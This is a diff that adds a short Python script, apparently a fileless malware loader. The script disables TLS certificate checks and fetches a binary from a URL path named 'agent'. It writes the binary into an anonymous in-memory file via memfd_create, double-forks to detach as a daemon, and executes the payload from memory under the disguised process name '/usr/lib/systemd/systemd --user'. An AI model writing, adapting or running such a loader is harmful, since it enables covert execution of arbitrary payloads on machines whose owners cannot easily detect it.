@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+
+import os
+import ctypes
+import urllib.request
+import ssl
+BINARY_URL = "https://127.0.0.1:8000/static/templates/public/files/agent"
+ssl_context = ssl._create_unverified_context()
+try:
+    libc = ctypes.CDLL(None)
+except OSError as e:
+    print(f"Error loading libc: {e}")
+    exit(1)
+memfd_create = libc.memfd_create
+memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
+memfd_create.restype = ctypes.c_int
+def run_fileless():
+    try:
+        with urllib.request.urlopen(BINARY_URL, context=ssl_context, timeout=10) as response:
+            if not (200 <= response.status < 300):
+                return
+            binary_content = response.read()
+    except Exception as e:
+        return
+    fd = memfd_create(b"elf", 1)
+    if fd == -1:
+        return
+    os.write(fd, binary_content)
+    pid = os.fork()
+    if pid > 0:
+        os._exit(0)
+    os.setsid()
+    pid = os.fork()
+    if pid > 0:
+        os._exit(0)
+    try:
+        fd_path = f"/proc/self/fd/{fd}"
+        os.execl(fd_path, "/usr/lib/systemd/systemd --user")
+    except OSError as e:
+        print(f"[!] Failed to execute from memory: {e}")
+        os._exit(1)
+if __name__ == "__main__":
+    run_fileless()
